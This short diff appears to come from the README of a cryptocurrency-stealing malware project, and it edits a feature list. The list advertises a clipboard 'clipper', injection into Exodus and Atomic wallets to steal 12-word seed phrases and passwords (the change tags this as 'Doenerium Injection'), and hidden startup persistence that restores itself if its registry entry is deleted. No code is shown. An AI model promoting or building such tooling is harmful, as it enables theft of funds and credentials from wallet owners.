@@ -39,7 +39,7 @@
 
 > No Dependent Clipper (exe does not need to stay running for the clipper to work)
 >
-> Wallet Injection 12words + passwords [ Exodus, Atomic ]
+> Wallet Injection 12words + passwords [ Exodus, Atomic ] (Doenerium Injection)
 > 
 > Percistance Hidden Startup + if reg get deleted = auto come back :)
 >
